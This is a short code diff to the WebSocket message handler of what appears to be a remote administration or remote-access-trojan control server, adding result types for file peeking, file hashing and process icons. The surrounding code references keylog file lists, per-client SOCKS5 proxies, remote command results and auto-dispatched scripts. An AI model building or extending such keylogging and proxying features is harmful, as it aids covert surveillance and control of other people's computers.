@@ -20,6 +20,7 @@ import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong 
 import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
 import { stopAllProxiesForClient } from "../socks5-proxy-manager";
 import { verifyBuildToken, isBuildBanned } from "../build-signing";
+import { clearThumbnail } from "../../thumbnails";
 
 const OFFLINE_GRACE_MS = (() => {
   const raw = process.env.OVERLORD_OFFLINE_GRACE_MS;
@@ -552,6 +553,8 @@ export async function handleWebSocketMessage(
         await handleHello(infoObj, payload as Hello, ws, ip);
         clientManager.addClient(infoObj.id, infoObj);
 
+        clearThumbnail(resolvedId);
+
         const reconnectedWithinGrace = cancelPendingOffline(infoObj.id);
 
         deps.dispatchAutoScriptsForConnection(infoObj, ws);
@@ -643,6 +646,8 @@ export async function handleWebSocketMessage(
       case "file_icon_result":
       case "file_thumb_result":
       case "file_dirsize_result":
+      case "file_peek_result":
+      case "file_hash_result":
       case "command_result":
         if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
           const pending = deps.pendingCommandReplies.get((payload as any).commandId);
@@ -676,6 +681,7 @@ export async function handleWebSocketMessage(
         deps.handleFileBrowserMessage(client.id, payload);
         break;
       case "process_list_result":
+      case "process_icon_result":
         deps.handleProcessMessage(client.id, payload);
         break;
       case "keylog_file_list":
